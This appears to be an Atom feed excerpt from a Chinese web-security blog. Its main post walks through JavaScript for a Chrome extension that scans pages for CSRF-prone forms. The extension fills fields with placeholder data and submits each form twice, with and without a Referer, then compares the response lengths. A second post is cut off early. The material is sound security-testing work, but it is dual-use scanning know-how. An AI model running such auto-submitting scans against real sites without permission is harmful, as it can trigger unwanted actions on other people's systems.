    <content type="html"><![CDATA[<h4 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a>0x00 前言：</h4><hr><p>上一篇只是大致说明整个思路和流程。本篇就详细说说如何检测CSRF。为什么不在上一篇中放出插件呢。是因为误报率确实是比较多，而且无法检测Referer。而本章，重点就说明“如何检测对方是否开启了Referer检测机制”。在我的认知范围内，这是首款检测Referer的工具(不知廉耻的笑了)。今天发现腾讯在2013年就做了类似的<a href="https://security.tencent.com/index.php/blog/msg/24" target="_blank" rel="external">产品</a> (这就尴尬了..)，不过还好。而且思路和实现方法有所区别。本章说检测Referer，第三章说检测token机制的强化,让检测token的成功率达到80~90%以上(其实就是写第二篇的时候，忘记写了。推到第三章了….)。而且这些是腾讯产品所没有的撒。<br><a id="more"></a></p><h4 id="0x01一些小的变化："><a href="#0x01一些小的变化：" class="headerlink" title="0x01一些小的变化："></a>0x01一些小的变化：</h4><hr><p>之前的黑白名单列表<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> placeholderFilterKeyword = [<span class="string">'跳'</span>,<span class="string">'搜'</span>,<span class="string">'查'</span>,<span class="string">'找'</span>,<span class="string">'登陆'</span>,<span class="string">'注册'</span>,<span class="string">'search'</span>];  <span class="comment">//无用表单黑名单，用于验证这个form表单有没有用（针对input验证）</span></div><div class="line"><span class="keyword">var</span> actionFilterKeyword = [<span class="string">'search'</span>,<span class="string">'find'</span>,<span class="string">'login'</span>,<span class="string">'reg'</span>];   <span class="comment">//无用表单黑名单，用于验证这个form表单有没有用（针对form表单验证）</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>现在的黑白名单列表：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> placeholderFilterKeyword = [<span class="string">'跳'</span>,<span class="string">'搜'</span>,<span class="string">'查'</span>,<span class="string">'找'</span>,<span class="string">'登陆'</span>,<span class="string">'注册'</span>,<span class="string">'search'</span>];</div><div class="line"><span class="keyword">var</span> actionFilterKeyword = [<span class="string">'search'</span>,<span class="string">'find'</span>,<span class="string">'login'</span>,<span class="string">'reg'</span>,<span class="string">"baidu.com"</span>,<span class="string">"google.com"</span>,<span class="string">"so.com"</span>,<span class="string">"bing.com"</span>,<span class="string">"soso.com"</span>,<span class="string">"sogou.com"</span>];</div></pre></td></tr></table></figure></p><p>此处的代码，决定了整体插件检测时的误报率大体走向。你也可以自己修改来达到自我感觉不错的地步。</p><p>现在的初始化变量：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> actionCache,actionPath;</div><div class="line"><span class="keyword">var</span> actionvParameter = <span class="string">""</span>;</div><div class="line"><span class="keyword">var</span> ajaxParameter = <span class="string">""</span>;</div></pre></td></tr></table></figure></p><h4 id="0x02：插件的整体框架"><a href="#0x02：插件的整体框架" class="headerlink" title="0x02：插件的整体框架"></a>0x02：插件的整体框架</h4><hr><p>因为Maxthon浏览器的API实在是太少，没有这些API我无法进行Referer检测，于是，检测CSRF插件，就不写Maxthon的插件了，下面是Chrome插件的框架：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/1.png" alt=""></p><blockquote><p>icons 是存放插件图标的地方，我比较懒，直接使用AutoFindXSS插件的图标。</p><p>background.html 是为了让我们修改插件的作用域，让我们可控，可以在Chrome的API中使用<code>jquery插件</code></p><p>background.js 这里我们把它理解为后端程序，类似于服务端的存在。用于处理<code>base.js</code>文件的数据</p><p>base.js 会在网站加载完成后调用。在<code>检测Referer</code>的时候，把数据传给<code>background.js</code>文件</p><p>manifest.json Chrome插件的核心文件，用于配置插件参数。</p></blockquote><p>这里我先给大家看一下manifest.json文件的内容：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="attr">"background"</span>: &#123;</div><div class="line">    <span class="attr">"page"</span>: <span class="string">"background.html"</span>,</div><div class="line">    <span class="attr">"persistent"</span>: <span class="literal">true</span></div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"name"</span>: <span class="string">"AutoFindCSRF"</span>,</div><div class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</div><div class="line">  <span class="attr">"manifest_version"</span>: <span class="number">2</span>,</div><div class="line">  <span class="attr">"description"</span>: <span class="string">"CSRF[by:Black-Hole&amp;158099591@qq.com]"</span>,</div><div class="line">  <span class="attr">"content_security_policy"</span>: <span class="string">"script-src 'self' 'unsafe-eval'; object-src 'self'"</span>,</div><div class="line">  <span class="attr">"permissions"</span>: [     </div><div class="line">    <span class="string">"&lt;all_urls&gt;"</span>,<span class="string">"tabs"</span></div><div class="line">  ],</div><div class="line">  <span class="attr">"icons"</span>:&#123;<span class="attr">"16"</span>: <span class="string">"icons/icon_16.png"</span>,<span class="attr">"48"</span>: <span class="string">"icons/icon_48.png"</span>,<span class="attr">"128"</span>: <span class="string">"icons/icon_128.png"</span>&#125;,</div><div class="line">  <span class="attr">"content_scripts"</span>: [&#123;</div><div class="line">    <span class="attr">"matches"</span>: [<span class="string">"*://*/*"</span>],</div><div class="line">    <span class="attr">"js"</span>: [<span class="string">"jquery.js"</span>,<span class="string">"base.js"</span>],</div><div class="line">    <span class="attr">"run_at"</span>: <span class="string">"document_end"</span></div><div class="line">  &#125;]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>content_security_policy 简称CSP，用户限制插件的安全性</p><p>permissions 是插件向Chrome申请的权限。</p><p>content_scripts 意思是，在任何协议下，当网站加载完成后，都会运行jquery.js和base.js文件。JavaScript this指向的是当前网页</p><p>background JavaScript this指向的是插件，用户处理base.js和background.js通信的存在</p></blockquote><p>而<a href="http://www.freebuf.com/articles/web/107207.html" target="_blank" rel="external">上一篇文章</a>的JavaScript代码，都存放在base.js里，待会说“检测Referer机制”时，也是写在这个文件里。</p><h4 id="0x03：检测对方是否开启了Referer检测机制"><a href="#0x03：检测对方是否开启了Referer检测机制" class="headerlink" title="0x03：检测对方是否开启了Referer检测机制"></a>0x03：检测对方是否开启了Referer检测机制</h4><hr><p>首先为了下面程序的简洁，先把当前表单的action地址赋值给一个变量：<br><code>actionCache = formDom.attr(&quot;action&quot;);</code></p><p>然后匹配action地址。为什么要匹配action地址呢，因为action分为以下几种情况：</p><blockquote><p>#test</p><p>./test.php &amp;&amp; ./test(处理方式一样)</p><p>/test.php?a=11</p><p>test.php</p><p><a href="http://baidu.com/?s=" target="_blank" rel="external">http://baidu.com/?s=</a></p></blockquote><p>这里我们使用switch来实现匹配，代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">switch</span>(actionCache[<span class="number">0</span>])&#123;</div><div class="line">    <span class="keyword">case</span> <span class="string">"#"</span>:</div><div class="line">        actionPath = location.href + actionCache;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">"/"</span>:</div><div class="line">        actionPath = location.origin + actionCache;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">"."</span>:</div><div class="line">        <span class="keyword">if</span>(actionCache.indexOf(<span class="string">"?"</span>) != <span class="string">"-1"</span>)&#123;</div><div class="line">            actionvParameter = <span class="string">"?"</span> + actionCache.split(<span class="string">"?"</span>)[<span class="number">1</span>];</div><div class="line">            actionCache = actionCache.slice(<span class="number">0</span>,actionCache.indexOf(<span class="string">"?"</span>));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(location.href.split(<span class="string">"/"</span>).pop().split(<span class="string">"."</span>).length == <span class="number">1</span>)&#123;</div><div class="line">            actionPath = location.href + actionCache.substr(<span class="number">1</span>,actionCache.length<span class="number">-1</span>) + actionvParameter;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(<span class="string">"/"</span>).pop())) + actionCache.substring(<span class="number">1</span>,actionCache.length) + actionvParameter;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">default</span>:</div><div class="line">        <span class="keyword">if</span>(location.protocol == <span class="string">"http:"</span> || location.protocol == <span class="string">"https:"</span>)&#123;</div><div class="line">            actionPath = location.href;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(location.href.split(<span class="string">"/"</span>).pop().split(<span class="string">"."</span>).length == <span class="number">1</span>)&#123;</div><div class="line">            actionPath = location.href + <span class="string">"/"</span> + actionCache;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(<span class="string">"/"</span>).pop())) + actionCache;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>当action地址的第一个值是<code>#</code>时，直接使用<code>location.href + actionCache;</code>拼接。</p><p>当action地址的第一个值是<code>/</code>时，使用<code>location.origin + actionCache;</code>来进行拼接</p><p>当action地址的第一个值是<code>.</code>时：<br>先使用indexOf函数来把参数赋值给一个变量并去除，<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(actionCache.indexOf(<span class="string">"?"</span>) != <span class="string">"-1"</span>)&#123;</div><div class="line">    actionvParameter = <span class="string">"?"</span> + actionCache.split(<span class="string">"?"</span>)[<span class="number">1</span>];</div><div class="line">    actionCache = actionCache.slice(<span class="number">0</span>,actionCache.indexOf(<span class="string">"?"</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>详细的情况如下：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/5.png" alt=""></p><p>然后根据有无后缀进行匹配：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(location.href.split(<span class="string">"/"</span>).pop().split(<span class="string">"."</span>).length == <span class="number">1</span>)&#123;</div><div class="line">    actionPath = location.href + actionCache.substr(<span class="number">1</span>,actionCache.length<span class="number">-1</span>) + actionvParameter;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(<span class="string">"/"</span>).pop())) + actionCache.substring(<span class="number">1</span>,actionCache.length) + actionvParameter;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><code>location.href.split(&quot;/&quot;).pop().split(&quot;.&quot;).length</code>是检测<code>当前url</code>有无后缀，如果有那么长度是为2.如果没有后缀长度是1。如果没有参数，将不会加任何字符串，因为在初始变量的时候就已经设为空了。详情如下：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/3.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/4.png" alt=""></p><p>除去这些之外，还有直接是文件名或者直接是url，这里呢，我直接写到switch的default分之上去了，因为无法使用<code>actionCache[0]</code>来匹配，代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">default</span>:</div><div class="line">    <span class="keyword">if</span>(location.protocol == <span class="string">"http:"</span> || location.protocol == <span class="string">"https:"</span>)&#123;</div><div class="line">        actionPath = location.href;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(location.href.split(<span class="string">"/"</span>).pop().split(<span class="string">"."</span>).length == <span class="number">1</span>)&#123;</div><div class="line">        actionPath = location.href + <span class="string">"/"</span> + actionCache;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(<span class="string">"/"</span>).pop())) + actionCache;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p><p>首先是判断<code>location.protocol</code>是否为http或https协议。如果是的话，直接使用<code>location.href;</code>。当不为<a href="http://或者https://的时候，跳过此if判断。接下来就是判断url的后缀存在。如果存在将运行：`actionPath" target="_blank" rel="external">http://或者https://的时候，跳过此if判断。接下来就是判断url的后缀存在。如果存在将运行：`actionPath</a> = location.href + “/“ + actionCache;`，反馈如图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/6.png" alt=""></p><p>当存在后缀时，运行：<code>actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&quot;/&quot;).pop())) + actionCache;</code>。反馈如图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/7.png" alt=""></p><h4 id="0x04：模拟form的参数"><a href="#0x04：模拟form的参数" class="headerlink" title="0x04：模拟form的参数"></a>0x04：模拟form的参数</h4><hr><p>代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> v = <span class="number">0</span>;v &lt; formDom.find(<span class="string">":text"</span>).length;v++)&#123;</div><div class="line">    <span class="keyword">var</span> input = formDom.find(<span class="string">":text"</span>).eq(v);</div><div class="line">    <span class="keyword">if</span>(input.attr(<span class="string">"name"</span>) != <span class="string">""</span>)&#123;</div><div class="line">        <span class="keyword">if</span>(input.val() == <span class="string">""</span>)&#123;</div><div class="line">            ajaxParameter += input.attr(<span class="string">"name"</span>) + <span class="string">"="</span> + <span class="string">"15874583485&amp;"</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            ajaxParameter += input.attr(<span class="string">"name"</span>) + <span class="string">"="</span> + input.val() + <span class="string">"&amp;"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">ajaxParameter = ajaxParameter.substring(<span class="number">0</span>,ajaxParameter.length<span class="number">-1</span>);</div></pre></td></tr></table></figure></p><p>使用for循环对当前form表单下属性为text的input标签，然后使用<code>var input = formDom.find(&quot;:text&quot;).eq(v);</code>来进行赋值，把当前的input赋值给input变量。</p><p>再使用if判断，当前的input标签是否存在name属性，如果没有，则使用<code>continue;</code>跳出初始化表达式变量为v的本次循环。如果存在，再判断当前的input的value属性里是否有值，如果有值则直接赋值给ajaxParameter。代码：<code>ajaxParameter += input.attr(&quot;name&quot;) + &quot;=&quot; + input.val() + &quot;&amp;&quot;;</code>，如果不存在则把<code>15874583485</code>赋值给ajaxParameter变量，为什么要使用类似于手机号码的呢，因为容错率挺高的。可以看到我在每次赋值的时候，都会在后面加上&amp;字符。因为方便下面发送ajax。当然需要去掉最后一个&amp;。于是乎，有了下面的代码：<code>ajaxParameter = ajaxParameter.substring(0,ajaxParameter.length-1);</code>。</p><h4 id="0x04：与插件的background-js进行通信"><a href="#0x04：与插件的background-js进行通信" class="headerlink" title="0x04：与插件的background.js进行通信"></a>0x04：与插件的background.js进行通信</h4><hr><p>这里呢，我先说说“检测Referer的思路”，在当前网站发送一次ajax请求，Referer的地址肯定是当前的URL，是正常的，和普通提交form表单是一样的，这里呢，把action地址和method值及参数传给插件，在插件里再发送一次AJAX请求，chrome插件发送AJAX时，Refere是为空的。两次提交，如果存在Referer检测，那么返回的结果长度肯定是不一样的，如果不存在Referer检测，长度是一样的（当然可能存在个别的差异，因为可能要显示时间等，结果长度不一样，但是是不存在“Referer检测”的，下面会增加容错率）</p><p>Chrome对插件通信提供了发送<code>chrome.runtime.sendMessage</code>和接受<code>chrome.runtime.onMessage.addListener</code>的API。<br>首先让我们来看看base.js文件里的发送<code>chrome.runtime.sendMessage</code>API代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$.ajax(&#123;</div><div class="line">    <span class="attr">url</span>: actionPath,</div><div class="line">    <span class="attr">type</span>: (formDom.attr(<span class="string">"method"</span>) == <span class="literal">undefined</span>) || (formDom.attr(<span class="string">"method"</span>) == <span class="string">'get'</span>)?<span class="string">'get'</span>:<span class="string">'post'</span>,</div><div class="line">    <span class="attr">dataType</span>: <span class="string">'html'</span>,</div><div class="line">    <span class="attr">data</span>: (formDom.attr(<span class="string">"method"</span>) == <span class="literal">undefined</span>) || (formDom.attr(<span class="string">"method"</span>) == <span class="string">'get'</span>)?<span class="string">''</span>:ajaxParameter,</div><div class="line">    <span class="attr">async</span>: <span class="literal">false</span>,</div><div class="line">&#125;)</div><div class="line">.done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> firstAjax = data.length;</div><div class="line">    <span class="keyword">var</span> formCache = formDom;</div><div class="line">    chrome.runtime.sendMessage(&#123;<span class="attr">action</span>: actionPath, <span class="attr">parameter</span>: (formDom.attr(<span class="string">"method"</span>) == <span class="literal">undefined</span>) || (formDom.attr(<span class="string">"method"</span>) == <span class="string">'get'</span>)?<span class="string">''</span>:ajaxParameter&#125;,<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">Math</span>.abs(firstAjax - response.status) &lt; <span class="number">10</span>)&#123;</div><div class="line">            formCache.attr(<span class="string">"style"</span>,<span class="string">"border: 1px red solid;"</span>)</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p><p>因为form的method属性的值是不确定的。所以就需要对ajax的参数type进行设置：<code>(formDom.attr(&quot;method&quot;) == undefined) || (formDom.attr(&quot;method&quot;) == &#39;get&#39;)?&#39;get&#39;:&#39;post&#39;</code>，这里使用了三目运算符。当method的值不存在、为get的时候，type为get。当存在的时候，则为post。</p><p>下面的data参数同理。只不过没有了get、post选项。改为<code>&#39;&#39;:ajaxParameter</code>。因为method值为get时，参数是附在actionPath变量里的。当为post的时候，将把之前拼接的参数传给data参数。这里计算一下返回页面的长度<code>var firstAjax = data.length;</code>，至于下面的为什么要给变量再赋值一次呢，我也不知道，可能下面的Chrome API的作用域不同，导致在下面使用API的时候，使用formDom变量，结果不对。只能重新赋值给formCache变量，这个时候API才算正常。</p><p>下面就是Chrome的API了：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chrome.runtime.sendMessage(&#123;<span class="attr">action</span>: actionPath, <span class="attr">parameter</span>: (formDom.attr(<span class="string">"method"</span>) == <span class="literal">undefined</span>) || (formDom.attr(<span class="string">"method"</span>) == <span class="string">'get'</span>)?<span class="string">''</span>:ajaxParameter&#125;,<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">Math</span>.abs(firstAjax - response.status) &lt; <span class="number">10</span>)&#123;</div><div class="line">            formCache.attr(<span class="string">"style"</span>,<span class="string">"border: 1px red solid;"</span>)</div><div class="line">        &#125;</div><div class="line">    &#125;);</div></pre></td></tr></table></figure></p><p>这里的action和parameter是发送的参数及值。至于代码<code>(formDom.attr(&quot;method&quot;) == undefined) || (formDom.attr(&quot;method&quot;) == &#39;get&#39;)?&#39;&#39;:ajaxParameter</code>和上面同理，当为get的时候，不给parameter值，当为post的时候，值为ajaxParameter。<code>response</code>为回调函数，类似ajax的done函数，返回background.js的处理结果。</p><p>那background.js是如何处理的呢：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">chrome.runtime.onMessage.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">message,sender,sendResponse</span>)</span>&#123;</div><div class="line">    $.ajax(&#123;</div><div class="line">        <span class="attr">url</span>: message.action,</div><div class="line">        <span class="attr">type</span>: (message.parameter == <span class="string">""</span>)?<span class="string">'get'</span>:<span class="string">'post'</span>,</div><div class="line">        <span class="attr">dataType</span>: <span class="string">'html'</span>,</div><div class="line">        <span class="attr">data</span>: (message.parameter == <span class="string">""</span>)?<span class="string">''</span>:message.parameter,</div><div class="line">        <span class="attr">async</span>: <span class="literal">false</span>,</div><div class="line">    &#125;)</div><div class="line">    .done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">        sendResponse(&#123;<span class="attr">status</span>: data.length&#125;)</div><div class="line">    &#125;)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p><p><code>chrome.runtime.onMessage.addListener</code>是接受函数，然后就是AJAX了，在done函数里，有一个API是<code>sendResponse({status: data.length})</code>返回插件发送AJAX时的长度。这个时候前端base.js将会受到background.js文件的返回结果。代码就返回上面的处理方式了：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="built_in">Math</span>.abs(firstAjax - response.status) &lt; <span class="number">10</span>)&#123;</div><div class="line">    formCache.attr(<span class="string">"style"</span>,<span class="string">"border: 1px red solid;"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>这里的Math.abs是求绝对值的，当两次ajax返回的长度差值小于10的时候，说明不存在“Referer检测”，当大于10时，就说明存在“检测Referer的机制”了。这里的10就是<code>容错值</code>。</p><p>当存在CSRF漏洞的时候，会在form表单的外部包含一个红色的框，如图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/CSRF2/img/8.png" alt=""></p><h4 id="0x05：结尾"><a href="#0x05：结尾" class="headerlink" title="0x05：结尾"></a>0x05：结尾</h4><hr><p>这里的token验证机制还是不完整，我会在下一版中解决的。以及JSON Hijacking。<br>有可能存在第四章。</p><p>文章非常感谢：北风(2660668090)提供的思路及技术支持。</p><p>插件下载地址：<a href="http://pan.baidu.com/s/1geMUl7l" target="_blank" rel="external">http://pan.baidu.com/s/1geMUl7l</a></p><hr><h4 id="作者信息："><a href="#作者信息：" class="headerlink" title="作者信息："></a><code>作者信息：</code></h4><blockquote><p>Author:Black-Hole</p><p>Blog:<a href="http://bugs.cc/">http://bugs.cc/</a></p><p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="external">https://github.com/BlackHole1/</a></p><p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p><p>Email:158blackhole@gmail.com</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-前言：&quot;&gt;&lt;a href=&quot;#0x00-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言：&quot;&gt;&lt;/a&gt;0x00 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;上一篇只是大致说明整个思路和流程。本篇就详细说说如何检测CSRF。为什么不在上一篇中放出插件呢。是因为误报率确实是比较多，而且无法检测Referer。而本章，重点就说明“如何检测对方是否开启了Referer检测机制”。在我的认知范围内，这是首款检测Referer的工具(不知廉耻的笑了)。今天发现腾讯在2013年就做了类似的&lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/24&quot;&gt;产品&lt;/a&gt; (这就尴尬了..)，不过还好。而且思路和实现方法有所区别。本章说检测Referer，第三章说检测token机制的强化,让检测token的成功率达到80~90%以上(其实就是写第二篇的时候，忘记写了。推到第三章了….)。而且这些是腾讯产品所没有的撒。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>自动化检测CSRF</title>
    <link href="http://bugs.cc/2016/06/15/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8BCSRF/"/>
    <id>http://bugs.cc/2016/06/15/自动化检测CSRF/</id>
    <published>2016-06-15T12:49:37.000Z</published>
    <updated>2016-08-23T16:01:10.801Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a>0x00 前言：</h4><hr><p>之前写过自动化检测XSS插件，今天来一发自动化检测CSRF的插件。CSRF有多种情况的出现方式，而本章所说的内容没有办法做的那么全面，就比如JSON Hijacking（第二章或者第三章会写），本章我们就说说form表单导致的CSRF漏洞。<br>检测form表单类型的CSRF漏洞和检测form表单类型的XSS漏洞最大的不同就是：XSS需要提交才能检测到，而CSRF只需要分析form表单就行了。<br><a id="more"></a></p><h4 id="0x01-前期的准备工作："><a href="#0x01-前期的准备工作：" class="headerlink" title="0x01 前期的准备工作："></a>0x01 前期的准备工作：</h4><hr><p>既然要写，那么我们就需要demo来帮我们模拟真实环境的下的情况，而0x00节就说明了，本章只针对于form表单，所以我们的demo也就是各式各样的表单。如下图：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/CSRF/img/1.png" alt=""></p><p>基本上来说网上常见的表单类别都包含了，当然如果你发现有些表单没有加入进去，请说明一下，我将会在下一版中修改。</p><p>我们先遍历整个网页上的form表单。代码如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">outerFor:</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; $(<span class="string">"form"</span>).length;i++)&#123;</div><div class="line">    <span class="keyword">var</span> formDom = $(<span class="string">"form"</span>).eq(i); <span class="comment">//formDom代表本次循环的form表单元素</span></div><div class="line">    <span class="keyword">var</span> imageFileSuffix = [<span class="string">'.jpg'</span>,<span class="string">'.png'</span>,<span class="string">'.jpge'</span>,<span class="string">'.ico'</span>,<span class="string">'.gif'</span>,<span class="string">'.bmp'</span>]; <span class="comment">//图片后缀白名单，用户验证图片是否为验证码</span></div><div class="line">    <span class="keyword">var</span> placeholderFilterKeyword = [<span class="string">'跳'</span>,<span class="string">'搜'</span>,<span class="string">'查'</span>,<span class="string">'找'</span>,<span class="string">'登陆'</span>,<span class="string">'注册'</span>,<span class="string">'search'</span>];  <span class="comment">//无用表单黑名单，用于验证这个form表单有没有用（针对input验证）</span></div><div class="line">    <span class="keyword">var</span> actionFilterKeyword = [<span class="string">'search'</span>,<span class="string">'find'</span>,<span class="string">'login'</span>,<span class="string">'reg'</span>];   <span class="comment">//无用表单黑名单，用于验证这个form表单有没有用（针对form表单验证）</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>至于为什么要加上<code>outerFor:</code>，是因为这只是最外层的for循环，里面还有for循环，为了方便我们在最里层的for循环里跳出最外层的本次循环。在最里层的for循环里我会使用<code>continue outerFor;</code>来跳出最外层for的本次循环。（如果没有看懂，请返回上一行重新看，这很重要）</p><h4 id="0x02-去除类似搜索、页面跳转等无用的form表单："><a href="#0x02-去除类似搜索、页面跳转等无用的form表单：" class="headerlink" title="0x02 去除类似搜索、页面跳转等无用的form表单："></a>0x02 去除类似搜索、页面跳转等无用的form表单：</h4><hr><p>首先我们需要假象一下有没有特殊的form表单，比如没有action属性，把请求交给JavaScript来完成。而这种特殊的form表单也很常见，所以这里我就先使用if判断action是否存在：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(formDom.attr(<span class="string">"action"</span>) != <span class="literal">undefined</span>)&#123;</div><div class="line">    <span class="comment">//当action不为空的时候，进行下一步的操作</span></div><div 